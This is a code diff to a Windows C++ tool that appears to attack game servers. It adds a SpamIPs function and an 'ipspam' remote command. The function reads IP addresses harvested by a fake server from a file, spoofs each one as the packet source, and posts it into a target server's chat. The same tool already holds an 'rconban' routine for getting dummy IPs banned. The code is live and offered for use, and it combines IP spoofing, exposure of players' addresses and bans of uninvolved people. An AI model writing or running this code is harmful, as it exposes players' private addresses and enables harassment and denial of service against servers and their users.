@@ -10,6 +10,7 @@
 #include <string.h>
 #include <iostream>
 #include <fstream>
+#include <string>
 
 #include "winsock2.h"
 #include "ws2tcpip.h" //IP_HDRINCL is here
@@ -384,7 +385,46 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 
 void SpamIPs(const char *IP, int Port)
 {
-	// TODO: this. Read in a file line by line (file contains IPs fetched by fakeserver) and send a chatmsg with the IP to the server.
+	std::ifstream File("ips.txt");
+
+	if(!File)
+		return;
+
+	std::string Line;
+	while(std::getline(File, Line))
+	{
+		char aCmd[512][256] = {{0}};
+		ZeroMemory(&aCmd, sizeof(aCmd));
+		int Cmd = 0;
+		int Char = 0;
+
+		for(int i = 0; i < strlen(Line.c_str()); i++)
+		{
+			if(Line.c_str()[i] == ' ')
+			{
+				Cmd++;
+				Char = 0;
+				continue;
+			}
+
+			aCmd[Cmd][Char] = Line.c_str()[i];
+			Char++;
+		}
+
+		m_FromIP[0] = inet_addr(aCmd[0]);
+		m_FromPort = htons(atoi(aCmd[1]));
+
+		m_ToIP = inet_addr(IP);
+		m_ToPort = htons(Port);
+
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+		Reset(0);
+
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackSay(&buffer[0], 0, aCmd[0], 0);
+		SendData((const char*)buffer, BufferSize, 0);
+	}
 }
 
 void Tick()
@@ -503,7 +543,19 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					send(g_Client, "[Server]: Dummy for banning sent successfully!", strlen("[Server]: Dummy for banning sent successfully!"), 0);
 				}
 				else
-					send(g_Client, "[Server]: Please use: rconban <srvip> <srvport> <banip>", strlen("[Server]: Please use: rcon ban <srvip> <srvport> <banip>"), 0);
+					send(g_Client, "[Server]: Please use: rconban <srvip> <srvport> <banip>", strlen("[Server]: Please use: rconban <srvip> <srvport> <banip>"), 0);
+			}
+			else if(strcmp(aCmd[0], "ipspam") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0])
+				{
+					int Port = atoi(aCmd[2]);
+					SpamIPs(aCmd[1], Port);
+
+					send(g_Client, "[Server]: Spam sent successfully!", strlen("[Server]: Spam sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: ipspam <srvip> <srvport>", strlen("[Server]: Please use: ipspam <srvip> <srvport>"), 0);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
